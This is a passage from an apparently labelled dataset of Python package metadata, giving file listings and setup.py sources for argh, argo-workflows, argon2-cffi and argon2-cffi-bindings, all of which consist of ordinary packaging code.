                break
    assert __version__, 'argh.__version__ must be imported correctly'
else:
    #
    # Python 2.7, 3.x
    #
    install_requires = []
    from argh import __version__


with io.open(os.path.join(os.path.dirname(__file__), 'README.rst'),
             encoding='ascii') as f:
	readme = f.read()


class PyTest(TestCommand):
    # see http://pytest.org/latest/goodpractises.html#integration-with-setuptools-distribute-test-commands

    def finalize_options(self):
        TestCommand.finalize_options(self)
        self.test_args = []
        self.test_suite = True

    def run_tests(self):
        #import here, cause outside the eggs aren't loaded
        import pytest
        errno = pytest.main(self.test_args)
        sys.exit(errno)


setup(
    # overview
    name = 'argh',
    description = 'An unobtrusive argparse wrapper with natural syntax',
    long_description = readme,

    # technical info
    version = __version__,
    packages = ['argh'],
    provides = ['argh'],
    install_requires = install_requires,

    # testing
    tests_require = ['pytest', 'mock', 'iocapture'],
    cmdclass = {'test': PyTest},

    # copyright
    author = 'Andrey Mikhaylenko',
    author_email = 'neithere@gmail.com',
    license = 'GNU Lesser General Public License (LGPL), Version 3',

    # more info
    url = 'http://github.com/neithere/argh/',

    # categorization
    keywords     = ('cli command line argparse optparse argument option'),
    classifiers  = [
        'Development Status :: 4 - Beta',
        'Environment :: Console',
        'Intended Audience :: Developers',
        'Intended Audience :: Information Technology',
        'License :: OSI Approved :: GNU Library or Lesser General Public License (LGPL)',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.6',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.2',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: Implementation :: CPython',
        'Programming Language :: Python :: Implementation :: PyPy',
        'Topic :: Software Development :: User Interfaces',
        'Topic :: Software Development :: Libraries :: Python Modules',
    ],
)
",1
argo-workflows-6.3.9,0,1,1,1,0,0,0,0,archived_workflow_service_api.py artifact_service_api.py cluster_workflow_template_service_api.py cron_workflow_service_api.py event_service_api.py event_source_service_api.py info_service_api.py pipeline_service_api.py sensor_service_api.py workflow_service_api.py workflow_template_service_api.py __init__.py __init__.py api_client.py configuration.py exceptions.py affinity.py aws_elastic_block_store_volume_source.py azure_disk_volume_source.py azure_file_volume_source.py capabilities.py ceph_fs_volume_source.py cinder_volume_source.py condition.py config_map_env_source.py config_map_key_selector.py config_map_projection.py config_map_volume_source.py container.py container_port.py create_options.py csi_volume_source.py downward_api_projection.py downward_api_volume_file.py downward_api_volume_source.py duration.py empty_dir_volume_source.py env_from_source.py env_var.py env_var_source.py ephemeral_volume_source.py event.py eventsource_create_event_source_request.py eventsource_event_source_watch_event.py eventsource_log_entry.py eventsource_update_event_source_request.py event_series.py event_source.py exec_action.py fc_volume_source.py flex_volume_source.py flocker_volume_source.py gce_persistent_disk_volume_source.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_abstra github_com_argoproj_labs_argo_dataflow_api_v1alpha1_abstract_step.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_abstract_volume_source.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_aws_cr github_com_argoproj_labs_argo_dataflow_api_v1alpha1_aws_credentials.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_aws_en github_com_argoproj_labs_argo_dataflow_api_v1alpha1_aws_endpoint.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_backof github_com_argoproj_labs_argo_dataflow_api_v1alpha1_backoff.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_cat.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_code.p github_com_argoproj_labs_argo_dataflow_api_v1alpha1_code.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_contai github_com_argoproj_labs_argo_dataflow_api_v1alpha1_container.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_cron.p github_com_argoproj_labs_argo_dataflow_api_v1alpha1_cron.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_databa github_com_argoproj_labs_argo_dataflow_api_v1alpha1_database.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_db_dat github_com_argoproj_labs_argo_dataflow_api_v1alpha1_db_data_source.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_db_data_source_from.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_db_sin github_com_argoproj_labs_argo_dataflow_api_v1alpha1_db_sink.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_db_sou github_com_argoproj_labs_argo_dataflow_api_v1alpha1_db_source.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_dedupe github_com_argoproj_labs_argo_dataflow_api_v1alpha1_dedupe.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_expand github_com_argoproj_labs_argo_dataflow_api_v1alpha1_expand.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_filter github_com_argoproj_labs_argo_dataflow_api_v1alpha1_filter.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_flatte github_com_argoproj_labs_argo_dataflow_api_v1alpha1_flatten.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_git.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_group. github_com_argoproj_labs_argo_dataflow_api_v1alpha1_group.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_http_h github_com_argoproj_labs_argo_dataflow_api_v1alpha1_http_header.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_http_header_source.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_http_s github_com_argoproj_labs_argo_dataflow_api_v1alpha1_http_sink.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_http_source.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_interf github_com_argoproj_labs_argo_dataflow_api_v1alpha1_interface.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_jet_st github_com_argoproj_labs_argo_dataflow_api_v1alpha1_jet_stream.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_jet_stream_sink.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_jet_stream_source.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_kafka. github_com_argoproj_labs_argo_dataflow_api_v1alpha1_kafka.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_kafka_ github_com_argoproj_labs_argo_dataflow_api_v1alpha1_kafka_config.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_kafka_net.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_kafka_sink.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_kafka_source.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_log.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_map.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_metada github_com_argoproj_labs_argo_dataflow_api_v1alpha1_metadata.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_nats_a github_com_argoproj_labs_argo_dataflow_api_v1alpha1_nats_auth.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_pipeli github_com_argoproj_labs_argo_dataflow_api_v1alpha1_pipeline.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_pipeline_list.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_pipeline_spec.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_pipeline_status.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_s3.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_s3_sin github_com_argoproj_labs_argo_dataflow_api_v1alpha1_s3_sink.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_s3_sou github_com_argoproj_labs_argo_dataflow_api_v1alpha1_s3_source.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_sasl.p github_com_argoproj_labs_argo_dataflow_api_v1alpha1_sasl.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_scale. github_com_argoproj_labs_argo_dataflow_api_v1alpha1_scale.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_sideca github_com_argoproj_labs_argo_dataflow_api_v1alpha1_sidecar.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_sink.p github_com_argoproj_labs_argo_dataflow_api_v1alpha1_sink.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_source github_com_argoproj_labs_argo_dataflow_api_v1alpha1_source.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_sql_ac github_com_argoproj_labs_argo_dataflow_api_v1alpha1_sql_action.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_sql_st github_com_argoproj_labs_argo_dataflow_api_v1alpha1_sql_statement.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_stan.p github_com_argoproj_labs_argo_dataflow_api_v1alpha1_stan.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_step.p github_com_argoproj_labs_argo_dataflow_api_v1alpha1_step.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_step_s github_com_argoproj_labs_argo_dataflow_api_v1alpha1_step_spec.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_step_status.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_storag github_com_argoproj_labs_argo_dataflow_api_v1alpha1_storage.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_tls.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_volume github_com_argoproj_labs_argo_dataflow_api_v1alpha1_volume_sink.py github_com_argoproj_labs_argo_dataflow_api_v1alpha1_volume_source.py git_repo_volume_source.py glusterfs_volume_source.py google_protobuf_any.py group_version_resource.py grpc_action.py grpc_gateway_runtime_error.py grpc_gateway_runtime_stream_error.py host_alias.py host_path_volume_source.py http_get_action.py http_header.py io_argoproj_events_v1alpha1_amount.py io_argoproj_events_v1alpha1_amqp_consume_config.py io_argoproj_events_v1alpha1_amqp_event_source.py io_argoproj_events_v1alpha1_amqp_exchange_declare_config.p io_argoproj_events_v1alpha1_amqp_exchange_declare_config.py io_argoproj_events_v1alpha1_amqp_queue_bind_config.py io_argoproj_events_v1alpha1_amqp_queue_declare_config.py io_argoproj_events_v1alpha1_argo_workflow_trigger.py io_argoproj_events_v1alpha1_artifact_location.py io_argoproj_events_v1alpha1_aws_lambda_trigger.py io_argoproj_events_v1alpha1_azure_events_hub_event_source. io_argoproj_events_v1alpha1_azure_events_hub_event_source.py io_argoproj_events_v1alpha1_azure_event_hubs_trigger.py io_argoproj_events_v1alpha1_backoff.py io_argoproj_events_v1alpha1_basic_auth.py io_argoproj_events_v1alpha1_bitbucket_auth.py io_argoproj_events_v1alpha1_bitbucket_basic_auth.py io_argoproj_events_v1alpha1_bitbucket_event_source.py io_argoproj_events_v1alpha1_bitbucket_server_event_source. io_argoproj_events_v1alpha1_bitbucket_server_event_source.py io_argoproj_events_v1alpha1_bitbucket_server_repository.py io_argoproj_events_v1alpha1_calendar_event_source.py io_argoproj_events_v1alpha1_catchup_configuration.py io_argoproj_events_v1alpha1_condition.py io_argoproj_events_v1alpha1_conditions_reset_by_time.py io_argoproj_events_v1alpha1_conditions_reset_criteria.py io_argoproj_events_v1alpha1_config_map_persistence.py io_argoproj_events_v1alpha1_custom_trigger.py io_argoproj_events_v1alpha1_data_filter.py io_argoproj_events_v1alpha1_emitter_event_source.py io_argoproj_events_v1alpha1_event_context.py io_argoproj_events_v1alpha1_event_dependency.py io_argoproj_events_v1alpha1_event_dependency_filter.py io_argoproj_events_v1alpha1_event_dependency_transformer.p io_argoproj_events_v1alpha1_event_dependency_transformer.py io_argoproj_events_v1alpha1_event_persistence.py io_argoproj_events_v1alpha1_event_source.py io_argoproj_events_v1alpha1_event_source_filter.py io_argoproj_events_v1alpha1_event_source_list.py io_argoproj_events_v1alpha1_event_source_spec.py io_argoproj_events_v1alpha1_event_source_status.py io_argoproj_events_v1alpha1_expr_filter.py io_argoproj_events_v1alpha1_file_artifact.py io_argoproj_events_v1alpha1_file_event_source.py io_argoproj_events_v1alpha1_generic_event_source.py io_argoproj_events_v1alpha1_github_app_creds.py io_argoproj_events_v1alpha1_github_event_source.py io_argoproj_events_v1alpha1_gitlab_event_source.py io_argoproj_events_v1alpha1_git_artifact.py io_argoproj_events_v1alpha1_git_creds.py io_argoproj_events_v1alpha1_git_remote_config.py io_argoproj_events_v1alpha1_hdfs_event_source.py io_argoproj_events_v1alpha1_http_trigger.py io_argoproj_events_v1alpha1_int64_or_string.py io_argoproj_events_v1alpha1_k8_s_resource_policy.py io_argoproj_events_v1alpha1_kafka_consumer_group.py io_argoproj_events_v1alpha1_kafka_event_source.py io_argoproj_events_v1alpha1_kafka_trigger.py io_argoproj_events_v1alpha1_log_trigger.py io_argoproj_events_v1alpha1_metadata.py io_argoproj_events_v1alpha1_mqtt_event_source.py io_argoproj_events_v1alpha1_nats_auth.py io_argoproj_events_v1alpha1_nats_events_source.py io_argoproj_events_v1alpha1_nats_trigger.py io_argoproj_events_v1alpha1_nsq_event_source.py io_argoproj_events_v1alpha1_open_whisk_trigger.py io_argoproj_events_v1alpha1_owned_repositories.py io_argoproj_events_v1alpha1_payload_field.py io_argoproj_events_v1alpha1_pub_sub_event_source.py io_argoproj_events_v1alpha1_pulsar_event_source.py io_argoproj_events_v1alpha1_pulsar_trigger.py io_argoproj_events_v1alpha1_rate_limit.py io_argoproj_events_v1alpha1_redis_event_source.py io_argoproj_events_v1alpha1_resource.py io_argoproj_events_v1alpha1_resource_event_source.py io_argoproj_events_v1alpha1_resource_filter.py io_argoproj_events_v1alpha1_s3_artifact.py io_argoproj_events_v1alpha1_s3_bucket.py io_argoproj_events_v1alpha1_s3_filter.py io_argoproj_events_v1alpha1_sasl_config.py io_argoproj_events_v1alpha1_secure_header.py io_argoproj_events_v1alpha1_selector.py io_argoproj_events_v1alpha1_sensor.py io_argoproj_events_v1alpha1_sensor_list.py io_argoproj_events_v1alpha1_sensor_spec.py io_argoproj_events_v1alpha1_sensor_status.py io_argoproj_events_v1alpha1_service.py io_argoproj_events_v1alpha1_slack_event_source.py io_argoproj_events_v1alpha1_slack_trigger.py io_argoproj_events_v1alpha1_sns_event_source.py io_argoproj_events_v1alpha1_sqs_event_source.py io_argoproj_events_v1alpha1_standard_k8_s_trigger.py io_argoproj_events_v1alpha1_status.py io_argoproj_events_v1alpha1_status_policy.py io_argoproj_events_v1alpha1_storage_grid_event_source.py io_argoproj_events_v1alpha1_storage_grid_filter.py io_argoproj_events_v1alpha1_stripe_event_source.py io_argoproj_events_v1alpha1_template.py io_argoproj_events_v1alpha1_time_filter.py io_argoproj_events_v1alpha1_tls_config.py io_argoproj_events_v1alpha1_trigger.py io_argoproj_events_v1alpha1_trigger_parameter.py io_argoproj_events_v1alpha1_trigger_parameter_source.py io_argoproj_events_v1alpha1_trigger_policy.py io_argoproj_events_v1alpha1_trigger_template.py io_argoproj_events_v1alpha1_url_artifact.py io_argoproj_events_v1alpha1_value_from_source.py io_argoproj_events_v1alpha1_watch_path_config.py io_argoproj_events_v1alpha1_webhook_context.py io_argoproj_workflow_v1alpha1_archive_strategy.py io_argoproj_workflow_v1alpha1_arguments.py io_argoproj_workflow_v1alpha1_artifact.py io_argoproj_workflow_v1alpha1_artifactory_artifact.py io_argoproj_workflow_v1alpha1_artifactory_artifact_reposit io_argoproj_workflow_v1alpha1_artifactory_artifact_repository.py io_argoproj_workflow_v1alpha1_artifact_location.py io_argoproj_workflow_v1alpha1_artifact_paths.py io_argoproj_workflow_v1alpha1_artifact_repository.py io_argoproj_workflow_v1alpha1_artifact_repository_ref.py io_argoproj_workflow_v1alpha1_artifact_repository_ref_stat io_argoproj_workflow_v1alpha1_artifact_repository_ref_status.py io_argoproj_workflow_v1alpha1_backoff.py io_argoproj_workflow_v1alpha1_cache.py io_argoproj_workflow_v1alpha1_cluster_workflow_template.py io_argoproj_workflow_v1alpha1_cluster_workflow_template_cr io_argoproj_workflow_v1alpha1_cluster_workflow_template_create_request.py io_argoproj_workflow_v1alpha1_cluster_workflow_template_li io_argoproj_workflow_v1alpha1_cluster_workflow_template_lint_request.py io_argoproj_workflow_v1alpha1_cluster_workflow_template_list.py io_argoproj_workflow_v1alpha1_cluster_workflow_template_up io_argoproj_workflow_v1alpha1_cluster_workflow_template_update_request.py io_argoproj_workflow_v1alpha1_condition.py io_argoproj_workflow_v1alpha1_container_node.py io_argoproj_workflow_v1alpha1_container_set_retry_strategy io_argoproj_workflow_v1alpha1_container_set_retry_strategy.py io_argoproj_workflow_v1alpha1_container_set_template.py io_argoproj_workflow_v1alpha1_continue_on.py io_argoproj_workflow_v1alpha1_counter.py io_argoproj_workflow_v1alpha1_create_cron_workflow_request io_argoproj_workflow_v1alpha1_create_cron_workflow_request.py io_argoproj_workflow_v1alpha1_create_s3_bucket_options.py io_argoproj_workflow_v1alpha1_cron_workflow.py io_argoproj_workflow_v1alpha1_cron_workflow_list.py io_argoproj_workflow_v1alpha1_cron_workflow_resume_request io_argoproj_workflow_v1alpha1_cron_workflow_resume_request.py io_argoproj_workflow_v1alpha1_cron_workflow_spec.py io_argoproj_workflow_v1alpha1_cron_workflow_status.py io_argoproj_workflow_v1alpha1_cron_workflow_suspend_reques io_argoproj_workflow_v1alpha1_cron_workflow_suspend_request.py io_argoproj_workflow_v1alpha1_dag_task.py io_argoproj_workflow_v1alpha1_dag_template.py io_argoproj_workflow_v1alpha1_data.py io_argoproj_workflow_v1alpha1_data_source.py io_argoproj_workflow_v1alpha1_event.py io_argoproj_workflow_v1alpha1_executor_config.py io_argoproj_workflow_v1alpha1_gauge.py io_argoproj_workflow_v1alpha1_gcs_artifact.py io_argoproj_workflow_v1alpha1_gcs_artifact_repository.py io_argoproj_workflow_v1alpha1_get_user_info_response.py io_argoproj_workflow_v1alpha1_git_artifact.py io_argoproj_workflow_v1alpha1_hdfs_artifact.py io_argoproj_workflow_v1alpha1_hdfs_artifact_repository.py io_argoproj_workflow_v1alpha1_header.py io_argoproj_workflow_v1alpha1_histogram.py io_argoproj_workflow_v1alpha1_http.py io_argoproj_workflow_v1alpha1_http_artifact.py io_argoproj_workflow_v1alpha1_http_header.py io_argoproj_workflow_v1alpha1_http_header_source.py io_argoproj_workflow_v1alpha1_info_response.py io_argoproj_workflow_v1alpha1_inputs.py io_argoproj_workflow_v1alpha1_label_keys.py io_argoproj_workflow_v1alpha1_label_values.py io_argoproj_workflow_v1alpha1_label_value_from.py io_argoproj_workflow_v1alpha1_lifecycle_hook.py io_argoproj_workflow_v1alpha1_link.py io_argoproj_workflow_v1alpha1_lint_cron_workflow_request.p io_argoproj_workflow_v1alpha1_lint_cron_workflow_request.py io_argoproj_workflow_v1alpha1_log_entry.py io_argoproj_workflow_v1alpha1_memoization_status.py io_argoproj_workflow_v1alpha1_memoize.py io_argoproj_workflow_v1alpha1_metadata.py io_argoproj_workflow_v1alpha1_metrics.py io_argoproj_workflow_v1alpha1_metric_label.py io_argoproj_workflow_v1alpha1_mutex.py io_argoproj_workflow_v1alpha1_mutex_holding.py io_argoproj_workflow_v1alpha1_mutex_status.py io_argoproj_workflow_v1alpha1_node_result.py io_argoproj_workflow_v1alpha1_node_status.py io_argoproj_workflow_v1alpha1_node_synchronization_status. io_argoproj_workflow_v1alpha1_node_synchronization_status.py io_argoproj_workflow_v1alpha1_oss_artifact.py io_argoproj_workflow_v1alpha1_oss_artifact_repository.py io_argoproj_workflow_v1alpha1_oss_lifecycle_rule.py io_argoproj_workflow_v1alpha1_outputs.py io_argoproj_workflow_v1alpha1_parallel_steps.py io_argoproj_workflow_v1alpha1_parameter.py io_argoproj_workflow_v1alpha1_pod_gc.py io_argoproj_workflow_v1alpha1_prometheus.py io_argoproj_workflow_v1alpha1_raw_artifact.py io_argoproj_workflow_v1alpha1_resource_template.py io_argoproj_workflow_v1alpha1_retry_affinity.py io_argoproj_workflow_v1alpha1_retry_strategy.py io_argoproj_workflow_v1alpha1_s3_artifact.py io_argoproj_workflow_v1alpha1_s3_artifact_repository.py io_argoproj_workflow_v1alpha1_s3_encryption_options.py io_argoproj_workflow_v1alpha1_script_template.py io_argoproj_workflow_v1alpha1_semaphore_holding.py io_argoproj_workflow_v1alpha1_semaphore_ref.py io_argoproj_workflow_v1alpha1_semaphore_status.py io_argoproj_workflow_v1alpha1_sequence.py io_argoproj_workflow_v1alpha1_submit.py io_argoproj_workflow_v1alpha1_submit_opts.py io_argoproj_workflow_v1alpha1_suspend_template.py io_argoproj_workflow_v1alpha1_synchronization.py io_argoproj_workflow_v1alpha1_synchronization_status.py io_argoproj_workflow_v1alpha1_tar_strategy.py io_argoproj_workflow_v1alpha1_template.py io_argoproj_workflow_v1alpha1_template_ref.py io_argoproj_workflow_v1alpha1_transformation_step.py io_argoproj_workflow_v1alpha1_ttl_strategy.py io_argoproj_workflow_v1alpha1_update_cron_workflow_request io_argoproj_workflow_v1alpha1_update_cron_workflow_request.py io_argoproj_workflow_v1alpha1_user_container.py io_argoproj_workflow_v1alpha1_value_from.py io_argoproj_workflow_v1alpha1_version.py io_argoproj_workflow_v1alpha1_volume_claim_gc.py io_argoproj_workflow_v1alpha1_workflow.py io_argoproj_workflow_v1alpha1_workflow_create_request.py io_argoproj_workflow_v1alpha1_workflow_event_binding.py io_argoproj_workflow_v1alpha1_workflow_event_binding_list. io_argoproj_workflow_v1alpha1_workflow_event_binding_list.py io_argoproj_workflow_v1alpha1_workflow_event_binding_spec. io_argoproj_workflow_v1alpha1_workflow_event_binding_spec.py io_argoproj_workflow_v1alpha1_workflow_lint_request.py io_argoproj_workflow_v1alpha1_workflow_list.py io_argoproj_workflow_v1alpha1_workflow_metadata.py io_argoproj_workflow_v1alpha1_workflow_resubmit_request.py io_argoproj_workflow_v1alpha1_workflow_resume_request.py io_argoproj_workflow_v1alpha1_workflow_retry_request.py io_argoproj_workflow_v1alpha1_workflow_set_request.py io_argoproj_workflow_v1alpha1_workflow_spec.py io_argoproj_workflow_v1alpha1_workflow_status.py io_argoproj_workflow_v1alpha1_workflow_step.py io_argoproj_workflow_v1alpha1_workflow_stop_request.py io_argoproj_workflow_v1alpha1_workflow_submit_request.py io_argoproj_workflow_v1alpha1_workflow_suspend_request.py io_argoproj_workflow_v1alpha1_workflow_task_set_spec.py io_argoproj_workflow_v1alpha1_workflow_task_set_status.py io_argoproj_workflow_v1alpha1_workflow_template.py io_argoproj_workflow_v1alpha1_workflow_template_create_request.py io_argoproj_workflow_v1alpha1_workflow_template_lint_request.py io_argoproj_workflow_v1alpha1_workflow_template_list.py io_argoproj_workflow_v1alpha1_workflow_template_ref.py io_argoproj_workflow_v1alpha1_workflow_template_update_request.py io_argoproj_workflow_v1alpha1_workflow_terminate_request.py io_argoproj_workflow_v1alpha1_workflow_watch_event.py io_k8s_api_policy_v1beta1_pod_disruption_budget_spec.py iscsi_volume_source.py key_to_path.py label_selector.py label_selector_requirement.py lifecycle.py lifecycle_handler.py list_meta.py local_object_reference.py managed_fields_entry.py nfs_volume_source.py node_affinity.py node_selector.py node_selector_requirement.py node_selector_term.py object_field_selector.py object_meta.py object_reference.py owner_reference.py persistent_volume_claim.py persistent_volume_claim_condition.py persistent_volume_claim_spec.py persistent_volume_claim_status.py persistent_volume_claim_template.py persistent_volume_claim_volume_source.py photon_persistent_disk_volume_source.py pipeline_log_entry.py pipeline_pipeline_watch_event.py pipeline_step_watch_event.py pod_affinity.py pod_affinity_term.py pod_anti_affinity.py pod_dns_config.py pod_dns_config_option.py pod_security_context.py portworx_volume_source.py preferred_scheduling_term.py probe.py projected_volume_source.py quobyte_volume_source.py rbd_volume_source.py resource_field_selector.py resource_requirements.py scale_io_volume_source.py seccomp_profile.py secret_env_source.py secret_key_selector.py secret_projection.py secret_volume_source.py security_context.py sensor_create_sensor_request.py sensor_log_entry.py sensor_sensor_watch_event.py sensor_update_sensor_request.py service_account_token_projection.py service_port.py se_linux_options.py status_cause.py storage_os_volume_source.py stream_result_of_event.py stream_result_of_eventsource_event_source_watch_event.py stream_result_of_eventsource_log_entry.py stream_result_of_io_argoproj_workflow_v1alpha1_log_entry.py stream_result_of_io_argoproj_workflow_v1alpha1_workflow_watch_event.py stream_result_of_pipeline_log_entry.py stream_result_of_pipeline_pipeline_watch_event.py stream_result_of_pipeline_step_watch_event.py stream_result_of_sensor_log_entry.py stream_result_of_sensor_sensor_watch_event.py sysctl.py tcp_socket_action.py toleration.py typed_local_object_reference.py volume.py volume_device.py volume_mount.py volume_projection.py vsphere_virtual_disk_volume_source.py weighted_pod_affinity_term.py windows_security_context_options.py __init__.py __init__.py model_utils.py rest.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE PKG-INFO README.md setup.cfg setup.py test_archived_workflow_service_api.py test_artifact_service_api.py test_cluster_workflow_template_service_api.py test_cron_workflow_service_api.py test_event_service_api.py test_event_source_service_api.py test_info_service_api.py test_pipeline_service_api.py test_sensor_service_api.py test_workflow_service_api.py test_workflow_template_service_api.py,"""""""
    Argo Workflows API

    Argo Workflows is an open source container-native workflow engine for orchestrating parallel jobs on Kubernetes. For more information, please see https://argoproj.github.io/argo-workflows/  # noqa: E501

    The version of the OpenAPI document: VERSION
    Generated by: https://openapi-generator.tech
""""""


from setuptools import setup, find_packages  # noqa: H301

NAME = ""argo-workflows""
VERSION = ""6.3.9""
# To install the library, run the following
#
# python setup.py install
#
# prerequisite: setuptools
# http://pypi.python.org/pypi/setuptools

REQUIRES = [
  ""urllib3 >= 1.25.3"",
  ""python-dateutil"",
]

setup(
    name=NAME,
    version=VERSION,
    description=""Argo Workflows API"",
    author=""OpenAPI Generator community"",
    author_email=""team@openapitools.org"",
    url="""",
    keywords=[""OpenAPI"", ""OpenAPI-Generator"", ""Argo Workflows API""],
    python_requires="">=3.6"",
    install_requires=REQUIRES,
    packages=find_packages(exclude=[""test"", ""tests""]),
    include_package_data=True,
    long_description=""""""\
    Argo Workflows is an open source container-native workflow engine for orchestrating parallel jobs on Kubernetes. For more information, please see https://argoproj.github.io/argo-workflows/  # noqa: E501
    """"""
)
",1
argon2-cffi-21.3.0,0,1,1,1,0,0,1,0,CODE_OF_CONDUCT.md CONTRIBUTING.md FUNDING.yml SECURITY.md main.yml .pre-commit-config.yaml .readthedocs.yml AUTHORS.rst api.rst argon2.rst cli.rst conf.py faq.rst index.rst installation.rst license.rst login_example.py Makefile parameters.rst FAQ.rst LICENSE mypy.ini PKG-INFO pyproject.toml README.rst exceptions.py low_level.py profiles.py py.typed _legacy.py _password_hasher.py _typing.py _utils.py __init__.py __main__.py test_legacy.py test_low_level.py test_password_hasher.py test_utils.py __init__.py tox.ini,,1
argon2-cffi-bindings-21.2.0,0,1,1,1,1,0,1,0,CODE_OF_CONDUCT.md CONTRIBUTING.md FUNDING.yml SECURITY.md main.yml wheels.yml .gitignore .gitmodules .pre-commit-config.yaml CHANGELOG.md .git .gitattributes .gitignore .travis.yml appveyor.yml argon2-specs.pdf Argon2.sln CHANGELOG.md export.sh argon2.h argon2d argon2d.shasum argon2d_v16 argon2d_v16.shasum argon2i argon2i.shasum argon2id argon2id.shasum argon2id_v16 argon2id_v16.shasum argon2i_v16 argon2i_v16.shasum check-sums.ps1 check-sums.sh test.ps1 test.sh argon2-specs.tex IEEEtran.cls Makefile argon2-par.pdf compression.pdf generic.pdf power-distribution.jpg tradeoff.bib libargon2.pc.in LICENSE Makefile argon2.1 Package.swift README.md argon2.c bench.c blake2-impl.h blake2.h blake2b.c blamka-round-opt.h blamka-round-ref.h core.c core.h encoding.c encoding.h genkat.c genkat.h opt.c ref.c run.c test.c thread.c thread.h Argon2Opt.vcxproj Argon2Opt.vcxproj.filters Argon2OptBench.vcxproj Argon2OptBench.vcxproj.filters Argon2OptDll.vcxproj Argon2OptDll.vcxproj.filters Argon2OptGenKAT.vcxproj Argon2OptGenKAT.vcxproj.filters Argon2OptTestCI.vcxproj Argon2OptTestCI.vcxproj.filters Argon2Ref.vcxproj Argon2Ref.vcxproj.filters Argon2RefBench.vcxproj Argon2RefBench.vcxproj.filters Argon2RefDll.vcxproj Argon2RefDll.vcxproj.filters Argon2RefGenKAT.vcxproj Argon2RefGenKAT.vcxproj.filters Argon2RefTestCI.vcxproj Argon2RefTestCI.vcxproj.filters LICENSE MANIFEST.in PKG-INFO pyproject.toml README.md setup.cfg setup.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt _ffi_build.py __init__.py test_build.py test_smoke.py tox.ini,"# SPDX-License-Identifier: MIT

import pathlib
import platform
import sys

from setuptools import find_packages, setup


###############################################################################

NAME = ""argon2-cffi-bindings""
DESCRIPTION = ""Low-level CFFI bindings for Argon2""
URL = ""https://github.com/hynek/argon2-cffi-bindings""
LICENSE = ""MIT""
AUTHOR = ""Hynek Schlawack""
EMAIL = ""hs@ox.cx""

CFFI_MODULES = [""src/_argon2_cffi_bindings/_ffi_build.py:ffi""]
PYTHON_REQUIRES = "">=3.6""
SETUP_REQUIRES = [""cffi>=1.0.1"", ""setuptools_scm>=6.2""]
INSTALL_REQUIRES = [""cffi>=1.0.1""]
EXTRAS_REQUIRE = {""tests"": [""pytest""]}
EXTRAS_REQUIRE[""dev""] = EXTRAS_REQUIRE[""tests""] + [
    ""cogapp"",
    ""pre-commit"",
    ""wheel"",
]

KEYWORDS = [""password"", ""hash"", ""hashing"", ""security"", ""bindings"", ""cffi""]
PROJECT_URLS = {
    ""Source Code"": ""https://github.com/hynek/argon2-cffi-bindings"",
    ""Funding"": ""https://github.com/sponsors/hynek"",
    ""Tidelift"": ""https://tidelift.com/subscription/pkg/pypi-argon2-cffi?""
    ""utm_source=pypi-argon2-cffi&utm_medium=pypi"",
    ""Ko-fi"": ""https://ko-fi.com/the_hynek"",
}
CLASSIFIERS = [
    ""Development Status :: 5 - Production/Stable"",
    ""Intended Audience :: Developers"",
    ""License :: OSI Approved :: MIT License"",
    ""Natural Language :: English"",
    ""Operating System :: MacOS :: MacOS X"",
